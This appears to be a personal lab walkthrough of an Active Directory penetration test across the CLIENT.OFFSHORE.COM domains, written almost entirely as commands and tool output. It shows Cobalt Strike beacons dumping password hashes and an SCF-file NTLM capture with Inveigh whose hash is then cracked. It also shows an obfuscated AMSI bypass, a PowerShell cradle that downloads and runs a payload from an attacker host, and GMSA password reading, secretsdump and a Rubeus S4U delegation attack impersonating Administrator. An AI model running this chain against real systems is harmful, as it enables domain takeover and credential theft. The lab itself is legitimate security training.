
dumped a new `bloodhound` from `DC03`

in `bloodhound` search for `CLIENT.OFFSHORE.COM` to identify the new `domain`
![[Pasted image 20240201130515.png]]

here we are able to see that `DC03` `ADMIN.OFFSHORE.COM` is trusted by `DC04` `CLIENT.OFFSHORE.COM`
`hashdump`
```powershell
[02/01 10:00:00] beacon> hashdump
[02/01 10:00:00] [*] Tasked beacon to dump hashes
[02/01 10:00:00] [+] host called home, sent: 83262 bytes
[02/01 10:00:02] [+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f2594c9e60abf7e28e7601db343a7e24:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ea9112d4beb759907688c9e267eff246:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bankvault:3113:aad3b435b51404eeaad3b435b51404ee:0ce1cb01ade331cdba32d0e1fba338a1:::
notreal:14101:aad3b435b51404eeaad3b435b51404ee:b35c7bf9b99f1c145e3899532e66a167:::
buggin:14102:aad3b435b51404eeaad3b435b51404ee:04ce8ddde4faa56150404c42dff5cb83:::
DC03$:1000:aad3b435b51404eeaad3b435b51404ee:a309490aabcffeea561fb1d8b36607d0:::
MS01$:1107:aad3b435b51404eeaad3b435b51404ee:db505645b78f70ae01dd6cebbe4b2b8b:::
WS04$:1108:aad3b435b51404eeaad3b435b51404ee:2abf50d13b5e08b92ac2d90c1d125b99:::
DEV$:3101:aad3b435b51404eeaad3b435b51404ee:e2d58156ba42d6a8e83e931f5daaf62e:::
CLIENT$:3104:aad3b435b51404eeaad3b435b51404ee:8bd3e36602c3f8566f32ac3e1e69491f:::
```
in `DC03` `cobaltstrike` beacon utilized `ping` to get actual `IP` of `CLIENT.OFFSHORE.COM` `DC04`
```powershell
[02/01 09:44:08] beacon> run ping client.offshore.com
[02/01 09:44:08] [*] Tasked beacon to run: ping client.offshore.com
[02/01 09:44:08] [+] host called home, sent: 42 bytes
[02/01 09:44:11] [+] received output:

Pinging client.offshore.com [172.16.4.5] with 32 bytes of data:
Reply from 172.16.4.5: bytes=32 time<1ms TTL=127
Reply from 172.16.4.5: bytes=32 time<1ms TTL=127
Reply from 172.16.4.5: bytes=32 time<1ms TTL=127
Reply from 172.16.4.5: bytes=32 time<1ms TTL=127
Ping statistics for 172.16.4.5:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```
`portscanned` `DC04`
```powershell
[02/01 13:18:00] beacon> portscan 172.16.4.5
[02/01 13:18:00] [*] Tasked beacon to scan ports 1-1024,3389,5900-6000 on 172.16.4.5
[02/01 13:18:00] [+] host called home, sent: 95030 bytes
[02/01 13:18:02] [+] received output:
(ICMP) Target '172.16.4.5' is alive. [read 8 bytes]
172.16.4.5:5985
172.16.4.5:3389
172.16.4.5:636
172.16.4.5:593
172.16.4.5:464
172.16.4.5:389
172.16.4.5:139
172.16.4.5:135
172.16.4.5:88
172.16.4.5:53
172.16.4.5:445 (platform: 500 version: 10.0 name: DC04 domain: CLIENT)
Scanner module is complete

```
also `pinged` `ms02.client.offshore.com`
```powershell
[02/01 09:52:27] beacon> run ping ms02.client.offshore.com
[02/01 09:52:27] [*] Tasked beacon to run: ping ms02.client.offshore.com
[02/01 09:52:27] [+] host called home, sent: 47 bytes
[02/01 09:52:30] [+] received output:
Pinging ms02.client.offshore.com [172.16.4.31] with 32 bytes of data:
Reply from 172.16.4.31: bytes=32 time<1ms TTL=127
Reply from 172.16.4.31: bytes=32 time<1ms TTL=127
Reply from 172.16.4.31: bytes=32 time<1ms TTL=127
Reply from 172.16.4.31: bytes=32 time<1ms TTL=127
Ping statistics for 172.16.4.31:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms 
```
`portscanned` MS01
```powershell
[02/01 09:52:39] beacon> portscan 172.16.4.31
[02/01 09:52:40] [*] Tasked beacon to scan ports 1-1024,3389,5900-6000 on 172.16.4.31
[02/01 09:52:40] [+] host called home, sent: 95030 bytes
[02/01 09:52:42] [+] received output:
(ICMP) Target '172.16.4.31' is alive. [read 8 bytes]
172.16.4.31:5985
172.16.4.31:3389
172.16.4.31:139
172.16.4.31:135
172.16.4.31:445 (platform: 500 version: 10.0 name: MS02 domain: CLIENT)
Scanner module is complete
```
 utilized `buggin` `DA` credentials  to identify the shares 
```powershell
[rootðŸ’€~/SUT/offshore/dc03] [10.10.14.39] [2024-02-01 12:41:02] 
 â””â”€â•¼ # proxychains crackmapexec smb 172.16.4.31 -u buggin -d admin.offshore.com -H 04ce8ddde4faa56150404c42dff5cb83 --shares
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
SMB         172.16.4.31     445    MS02             [*] Windows Server 2016 Standard 14393 x64 (name:MS02) (domain:admin.offshore.com) (signing:False) (SMBv1:True)
SMB         172.16.4.31     445    MS02             [+] admin.offshore.com\buggin:04ce8ddde4faa56150404c42dff5cb83 
SMB         172.16.4.31     445    MS02             [+] Enumerated shares
SMB         172.16.4.31     445    MS02             Share           Permissions     Remark
SMB         172.16.4.31     445    MS02             -----           -----------     ------
SMB         172.16.4.31     445    MS02             ADMIN$                          Remote Admin
SMB         172.16.4.31     445    MS02             Banking_Data                    
SMB         172.16.4.31     445    MS02             C$                              Default share
SMB         172.16.4.31     445    MS02             IPC$                            Remote IPC
```
setup proxy pivot on `DC03` utilizing `5080`
![[Pasted image 20240219203123.png]]

```powershell
[rootðŸ’€~/SUT/offshore/dc03] [10.10.14.39] [2024-02-01 12:46:49] 
 â””â”€â•¼ # proxychains crackmapexec smb 172.16.4.31 -u bankvault -d admin.offshore.com -H 0ce1cb01ade331cdba32d0e1fba338a1 --shares
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
SMB         172.16.4.31     445    MS02             [*] Windows Server 2016 Standard 14393 x64 (name:MS02) (domain:admin.offshore.com) (signing:False) (SMBv1:True)
SMB         172.16.4.31     445    MS02             [+] admin.offshore.com\bankvault:0ce1cb01ade331cdba32d0e1fba338a1 
SMB         172.16.4.31     445    MS02             [+] Enumerated shares
SMB         172.16.4.31     445    MS02             Share           Permissions     Remark
SMB         172.16.4.31     445    MS02             -----           -----------     ------
SMB         172.16.4.31     445    MS02             ADMIN$                          Remote Admin
SMB         172.16.4.31     445    MS02             Banking_Data    READ,WRITE      
SMB         172.16.4.31     445    MS02             C$                              Default share
SMB         172.16.4.31     445    MS02             IPC$                            Remote IPC
```
using `smbclient` to connect to the drive
```powershell
â”Œâ”€â”€(rootðŸ’€gobots)-[19Feb2024 20:29:06]-[~/SUT/offshore/DC03]                                         
â””â”€# proxychains /usr/share/doc/python3-impacket/examples/smbclient.py ADMIN/bankvault@172.16.4.31 -hashes :0ce1cb01ade331cdba32d0e1fba338a1
```
was able to `put` `sniff.exe` reverse shell, but a process is running in the background that clears the drive. `Banking_Data`
![[Pasted image 20240201144736.png]]
pulled a new `bloodhound` with `execute-assembly /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe -c all --domain CLIENT.OFFSHORE.COM`

after looking at the `bankvault` account able to abuse `GenericAll` and become part of the `Account Operators@Cliet.Offshore.com`
![[Pasted image 20240201144736 1.png]]

once an `ACCOUNT_OPERATOR` can `GenericAll` to `MS02.CLIENT.OFFSHORE.COM` and `Delegation` to `DC04`
![[Pasted image 20240201144736 2.png]]
Googling `SMB Share Attacks` shows that `SCF` attacks are an option, which essentially IS AN `NTLM Relay Attack` where you enter the script below 
`https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/`

```powershell
[Shell]
Command=2
IconFile=\\172.16.3.5\anyshare\testing.exe
[Taskbar]
Command=ToggleDesktop
```
saved as `scf.scf`
```POWERSHELL
iex ((new-object net.webclient).downloadstring('http://10.10.14.39:8080/Inveigh.ps1')); Invoke-Inveigh -FileOutput Y -FileDirectory \\C:\windows\tasks

Invoke-Inveigh -FileOutput Y -FileDirectory \\C:\windows\tasks\testing\
```
worked but dropped files that dont have what we need in them
![[Pasted image 20240220000724.png]]

# Working
in a `fresh` powershell session for `DC03` host a python server in the location for 

pull over the file
```powershell
PS C:\windows\tasks> iex ((new-object net.webclient).downloadstring('http://10.10.14.39:8080/Inveigh.ps1')); Invoke-Inveigh -FileOutput Y
```
![[Pasted image 20240220003133.png]]
should see the Inveigh start
![[Pasted image 20240220003306.png]]

using `smbclient` to connect to the drive
```powershell
â”Œâ”€â”€(rootðŸ’€gobots)-[19Feb2024 20:29:06]-[~/SUT/offshore/DC03]                                         
â””â”€# proxychains /usr/share/doc/python3-impacket/examples/smbclient.py ADMIN/bankvault@172.16.4.31 -hashes :0ce1cb01ade331cdba32d0e1fba338a1
```
utilize `put scf.scf` to put file into the `bankvault` directory
![[Pasted image 20240220003438.png]]
by default it puts the file in your working directory, in this case its `C:\Windows\Tasks` on `DC03`
![[Pasted image 20240220003414.png]]
copy this input onto `linux` machine as `Inveigh-NTLMv2.txt`
```powershell
offshore_adm::CLIENT:37C07B7718FFEDCE:051F3B70DF66B7AC3F278D9890344081:01010000000000007402D34DBB63DA01F6C057B87C9EFFB80000000002000A00410044004D0049004E0001000800440043003000330004002400410044004D0049004E002E004F0046004600530048004F00520045002E0043004F004D0003002E0044004300300033002E00410044004D0049004E002E004F0046004600530048004F00520045002E0043004F004D0005002400410044004D0049004E002E004F0046004600530048004F00520045002E0043004F004D00070008007402D34DBB63DA0106000400020000000800300030000000000000000000000000200000EB5F5E2D2F103C3DFAAB078F94EE629E61F0B7BCB3557731B6D339114EB17BE50A0010000000000000000000000000000000000009001E0063006900660073002F003100370032002E00310036002E0033002E0035000000000000000000
```
use `dos2unix Inveigh-NTLMv2.txt ` to change the file into `unix` format
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[20Feb2024 00:14:57]-[~/SUT/offshore/DC03]                                                                                                                                                
â””â”€# dos2unix Inveigh-NTLMv2.txt                                                                                                                                                                             
dos2unix: converting file Inveigh-NTLMv2.txt to Unix format... 
```
![[Pasted image 20240220003650.png]]
use `john Inveigh-NTLMv2.txt -w=/usr/share/wordlists/rockyou.txt --fork=4` to break the password for the file
![[Pasted image 20240220003724.png]]
get the credentials `Banker!123` for the user `offshore_adm`
use `proxychains xfreerdp /u:offshore_adm /d:CLIENT /p:'Banker!123' /v:172.16.4.31` to attempt to rdp in and fail, probably because in the guide theres an `RDP` session already connected but in my bloodhound there is not.
![[Pasted image 20240220004045.png]]
![[Pasted image 20240220004102.png]]
crackmapexec to check
```powershell
[rootðŸ’€~] [10.10.14.39] [2024-02-20 00:45:04] 
 â””â”€â•¼ # proxychains crackmapexec rdp 172.16.4.31 -u 'offshore_adm' -p 'Banker!123'
```
welp
![[Pasted image 20240220004707.png]]
the `MS02` machine needed a full reset in order for rdp to begin working - thank you tyler
![[Pasted image 20240221151928.png]]
in order to get an initial beacon on `MS02` as `offshore_adm` open up a powershell session and utilize `AMSI` bypass below
```powershell
#obfuscated oneliner amsi bypass
$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
```
and 
```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.14.39:80/a'))"
```
![[Pasted image 20240221203929.png]]
once have a beacon as `offshore_adm` look at bloodhound to see what `offshore_adm` is able to do.
![[Pasted image 20240221204108.png]]
shows that `offshore_adm` and `svc_client_sec$` have `READGMSAPassword abuse available`
download `GMSAPasswordReader.exe` off `GITJUB` @ `https://github.com/expl0itabl3/Toolies` and in the `MS02` beacon as `offshore_adm` execute the tool to dump the `NTLM hash` of `svc_client_sec$`
- the `rc4_hmac` hash is the `NTLM` of `SVC_CLIENT_SEC$`
```powershell
[02/21 17:13:43] beacon> execute-assembly /root/SUT/offshore/ms02/Toolies-master/GMSAPasswordReader.exe --AccountName svc_client_sec
[02/21 17:13:43] [*] Tasked beacon to run .NET program: GMSAPasswordReader.exe --AccountName svc_client_sec
[02/21 17:13:43] [+] host called home, sent: 214836 bytes
[02/21 17:13:45] [+] received output:
Calculating hashes for Old Value
[*] Input username             : svc_client_sec$
[*] Input domain               : CLIENT.OFFSHORE.COM
[*] Salt                       : CLIENT.OFFSHORE.COMsvc_client_sec$
[*]       rc4_hmac             : 7F5AF4B17552A77256FB4128E5694558
[*]       aes128_cts_hmac_sha1 : 028FD9B099E025B884E0FA3703DEEBB2
[*]       aes256_cts_hmac_sha1 : E4F10EBBE2AF41FC4442FA3E30BFA411A978454F8994C0429891C3886420C2F7
[*]       des_cbc_md5          : 461A0BDAA1D6B973

Calculating hashes for Current Value
[*] Input username             : svc_client_sec$
[*] Input domain               : CLIENT.OFFSHORE.COM
[*] Salt                       : CLIENT.OFFSHORE.COMsvc_client_sec$
[*]       rc4_hmac             : 3B60057273A2B5B6B58F7B791C03A756
[*]       aes128_cts_hmac_sha1 : 0146C09F00F382901AAE8F3F46AAEE56
[*]       aes256_cts_hmac_sha1 : C2B3406C71B0C492AB44D15242A3D65A9EB4E0633AC553EE6BB894BD622EEB3A
[*]       des_cbc_md5          : 7FF19B67E67545A7

```
utilize the 2nd `rc4_hmac` to `psexec` onto `MS02`
```powershell
â”Œâ”€â”€(rootðŸ’€gobots)-[21Feb2024 18:33:31]-[~/SUT/offshore/ms02/Toolies-master]                                                                                                                                 
â””â”€# proxychains impacket-psexec 'CLIENT.OFFSHORE.COM/svc_client_sec$@172.16.4.31' -hashes :3B60057273A2B5B6B58F7B791C03A756                                                                                 
                                                                                                                                                                                                            
[proxychains] config file found: /etc/proxychains4.conf                                                                                                                                                     
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                                                                                                                      
Impacket v0.11.0 - Copyright 2023 Fortra                                                                                                                                                                    
                                                                                                                                                                                                            
[*] Requesting shares on 172.16.4.31.....                                                                                                                                                                   
[*] Found writable share ADMIN$                                                                                                                                                                             
[*] Uploading file gWoRjtJR.exe                                                                                                                                                                             
[*] Opening SVCManager on 172.16.4.31.....                                                                                                                                                                  
[*] Creating service RPKT on 172.16.4.31.....                                                                                                                                                               
[*] Starting service RPKT.....                                                                                                                                                                              
[!] Press help for extra shell commands                                                                                                                                                                     
Microsoft Windows [Version 10.0.14393]                                                                                                                                                                      
(c) 2016 Microsoft Corporation. All rights reserved.                                                                                                                                                        
                                                                                                                                                                                                            
C:\Windows\system32> cd C:\                                  
```
to get a `beacon` as `SYSTEM` on `MS02` uploaded a `http_x64.exe` beacon into `C:\Users\offshore_adm\Documents\http_x64.exe` on the `offshore_adm` beacon
![[Pasted image 20240221204839.png]]
moved the file to `C:\windows\tasks` and executed it through my `psexec` shell - shell was unstable
![[Pasted image 20240221205016.png]]
# I feel like a Kangaroo
![[Pasted image 20240221205213.png]]
# One Massive Screwup
once owning `MS02` pulling up bloodhound with `MS02` owned shows that `Constrained Delegation` exists with `MS02` & `DC04.client.offshore.com`
![[Pasted image 20240221205717.png]] 
because we already have `MS02` Administrator credentials we are able to dump the `MS02` machine account `NTLM` hash to delegate to `DC04`
```powershell
â”Œâ”€â”€(rootðŸ’€gobots)-[21Feb2024 18:04:59]-[~]                                                                                                                                                         [129/164]
â””â”€# proxychains impacket-secretsdump 'CLIENT/svc_client_sec$@172.16.4.31' -hashes :3B60057273A2B5B6B58F7B791C03A756                                                                                         
[proxychains] config file found: /etc/proxychains4.conf                                                                                                                                                     
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                                                                                                                      
Impacket v0.11.0 - Copyright 2023 Fortra                                                                                                                                                                    
                                                                                                                                                                                                            
[*] Service RemoteRegistry is in stopped state                                                                                                                                                              
[*] Starting service RemoteRegistry                                                                                                                                                                         
[*] Target system bootKey: 0x2bb3b90874b685ecc2dff677a6cb2d3c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
cleaner:1001:aad3b435b51404eeaad3b435b51404ee:6f97c037d2655e16c9dd6790b143a845:::
[*] Dumping cached domain logon information (domain/username:hash)
CLIENT.OFFSHORE.COM/Administrator:$DCC2$10240#Administrator#a5e79135295a5188c0b59831724deafc: (2023-11-03 15:34:51)
CLIENT.OFFSHORE.COM/offshore_adm:$DCC2$10240#offshore_adm#104071d1d2225aabb8895ac0e982d0cb: (2024-02-21 20:07:09)
ADMIN.OFFSHORE.COM/bankvault:$DCC2$10240#bankvault#459c1ba028a6710d67efa426aee34ecd: (2018-04-29 03:47:41)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CLIENT\MS02$:aes256-cts-hmac-sha1-96:a7ef524856fbf9113682384b725292dec23e54ab4e66cfdca8dd292b1bb198ae
CLIENT\MS02$:aes128-cts-hmac-sha1-96:2210c0c6eeba4b862de170c36d34e86b
CLIENT\MS02$:des-cbc-md5:8391a4ba31457cf7
CLIENT\MS02$:plain_password_hex:46006000600066002f0079005400660032005c006700370061004e004d002d00430042002f0064007800640020003b0078003600620055004700620057003d006f002000480046006700630076005500390049005100
3a004e00400044002900640074003b0071002f00420040005f007200590038005d0043002b003b0052005d0038006e0040007a004a005300730029003f005000740035005c002100640049007100220064005400240045005b00580033003600520047004c00
7a004b002f0050006d0030002c003c0071006d0071004d00240070006200650028002e0068005900520033005900660053007900
CLIENT\MS02$:aad3b435b51404eeaad3b435b51404ee:dc7a49c0c36399ae87f3de623ebab985:::
[*] DefaultPassword 
CLIENT\offshore_adm:Banker!123
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x21f1ebebd4637779e011395fe0e806a35143a5d6
dpapi_userkey:0x582905143d52e565a16704a91491fc470d1a9690
[*] NL$KM 
 0000   99 4F 5D 6C 55 B9 EC B5  0C 0B D8 75 A2 88 93 E4   .O]lU......u....
 0010   C0 D9 EF C5 0D B9 40 57  92 39 9A BE 9D A5 83 ED   ......@W.9......
 0020   11 CB 71 7C AB 32 CD 11  FD 7A ED 2E AB BE F1 62   ..q|.2...z.....b
 0030   58 F2 1D 8A AC 9F AC FB  32 17 D8 EE B3 BD A5 DC   X.......2.......
NL$KM:994f5d6c55b9ecb50c0bd875a28893e4c0d9efc50db9405792399abe9da583ed11cb717cab32cd11fd7aed2eabbef16258f21d8aac9facfb3217d8eeb3bda5dc
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```
MS02 machine account NTLM `dc7a49c0c36399ae87f3de623ebab985`
once we have the hash we are able to utilize rubeus as the machine account user `MS02` with `NTLM` hash to impersonate the `Administrator` utilizing the `cifs/dc04.client.offshore.com`
```powershell[02/21 19:32:01] beacon> execute-assembly /usr/share/poshc2/resources/modules/Rubeus.exe s4u /user:MS02$ /rc4:dc7a49c0c36399ae87f3de623ebab985 /impersonateuser:Administrator /msdsspn:cifs/dc04.client.offshore.com /domain:client.offshore.com /ptt /nowrap
[02/21 19:32:01] [*] Tasked beacon to run .NET program: Rubeus.exe s4u /user:MS02$ /rc4:dc7a49c0c36399ae87f3de623ebab985 /impersonateuser:Administrator /msdsspn:cifs/dc04.client.offshore.com /domain:client.offshore.com /ptt /nowrap
[02/21 19:32:01] [+] host called home, sent: 321092 bytes
[02/21 19:32:02] [+] received output:
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0 

[*] Action: S4U

[*] Using rc4_hmac hash: dc7a49c0c36399ae87f3de623ebab985

[02/21 19:32:03] [+] received output:
[*] Building AS-REQ (w/ preauth) for: 'client.offshore.com\MS02$'

[02/21 19:32:03] [+] received output:
[+] TGT request successful!
[*] base64(ticket.kirbi):
doIFljCCBZKgAwIBBaEDAgEWooIEmTCCBJVhggSRMIIEjaADAgEFoRUbE0NMSUVOVC5PRkZTSE9SRS5DT02iKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE2NsaWVudC5vZmZzaG9yZS5jb22jggRDMIIEP6ADAgESoQMCAQKiggQxBIIELRW2Hpnsoc579PLndn4CDzMbgoXczZSxjAXYuAM4BfokqOIFBgaENljweYBkNF3+gvPesEwiiECWevrw9IsgB8Kw2iBOTIyaMoVcfs8nsyln6L1Cbu0huvfoOXAz/Dzg3Q0dhgXR8gmyWRbsvfJb4ldYjOE8DFDnVRcSSG8CbAp8i7h19S6ewXfm2MGBUt9VlShvZiaYX6yVrHb8A4U7tRIphIC62Pv95TBJZfK0Ex7vxFy9ooqhbxge9g8k2ONygPI71Z0ve09yhEAT4ETKiSa27Kj0dv2ljFwyt0hAbsGRq4VC2tyBpF4vqFAGJSW3l994/14kDOPLGl/6p8eyqHsC9hQGyh5CU5o3/Pl8B80vr5Zto/xEbnwlhnpeQaiBMWX3SMHNW4DHERT6RSHLSsJEo/pHi2Cqx0qlkHembGpchjkpUx4eyustvWhXe3vQhjevgjjS+4S6tR/mscYjQDi8OIhSofnZyUVBJx4OQsv1G9SdCygJWLtUSYH0b9QdnePGQjZhjIMdi5pT/7/cNIYNV59nSgQgNhpm5NRUDjWeQFrvO7DzS4N/brpR/XhaOqoTuB66bwzMu4YO+8VXQAYF9dmPdnTzLtAhZZWP9k/LVj9wy4/ZEbnP3C+oXfw5+qi8EDfWa4VTphdqbBKaif++nhtWI8bqRSKkM5LUGNI7oyJavBJyFfu7vjlo+VCwX4sqPZUygq8a/uiT1tpuZCv/LzsrEk8PVWBn0bqYOHmzexLjrm2xQnNZJ4z2D/ijMFThKR2D0F3gPt3l/RMyp7125SMCXhsj710QCAviZWnxlKQUf58xrHgI2TEbbgc1EG7T5vg6qWUi1ozagI4Sz3emo83FxK76EBDLhnMYiTmVgdb+UnZoEGQfi3hAKrB39b49B+66H5Arh9ZUZpQ2EREHhwTmRzzd5/iC+5r02LiK73HM+CwkFz2WSUKEkOzIU2GdRFlXuh/mQdPIRgXjJjFQg2g0Kr+RXSRk3C6in7R+YxJ+VRwRYoCVukMYsjQ8SaSNRnYVSh6q4GUDupi05OeW4+zw/g7Ww5QgKXJcFd0dKnF9xT2jBIkgpOVmBOsatGwwQtmFwgrILAFFlFMtWLQyber849ooD6BZY82fLhm/PXo4gZK3SWcs4ssVtKz+m085VFAOKrBAcbIqc0YokPEiQfyg2kHMlOKYXgRTqq9AdOntsvIZjWCm3Jqs0QmvqzWKhdU3ik0ok7zwnkfPt5ziqQ6mLVvoFZtfWO4x8/y6iofIs15v5l3KoV3wjzmu0TZLWqRfmLK1E32xc4efPzwkCGmXDzS4wnqqHRbBJMrvTmrlHHI13oIbtaQi/29NUYSABjGcLu9OWH1uVrktCShq3GuweWIpTSk25chYZDI3k68wWyBhsKpUNphP+QmMxFQqZmbpMu5QXj679kmjgegwgeWgAwIBAKKB3QSB2n2B1zCB1KCB0TCBzjCBy6AbMBmgAwIBF6ESBBDlTVheQUIdCe7/7BbGqFcfoRUbE0NMSUVOVC5PRkZTSE9SRS5DT02iEjAQoAMCAQGhCTAHGwVNUzAyJKMHAwUAQOEAAKURGA8yMDI0MDIyMjAwMzIzN1qmERgPMjAyNDAyMjIxMDMyMzdapxEYDzIwMjQwMjI5MDAzMjM3WqgVGxNDTElFTlQuT0ZGU0hPUkUuQ09NqSgwJqADAgECoR8wHRsGa3JidGd0GxNjbGllbnQub2Zmc2hvcmUuY29t


[*] Action: S4U


[*] Using domain controller: DC04.CLIENT.OFFSHORE.COM (172.16.4.5)
[*] Building S4U2self request for: 'MS02$@CLIENT.OFFSHORE.COM'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator@CLIENT.OFFSHORE.COM' to 'MS02$@CLIENT.OFFSHORE.COM'
[*] base64(ticket.kirbi):
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


[*] Impersonating user 'Administrator' to target SPN 'cifs/dc04.client.offshore.com'
[*] Using domain controller: DC04.CLIENT.OFFSHORE.COM (172.16.4.5)
[*] Building S4U2proxy request for service: 'cifs/dc04.client.offshore.com'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
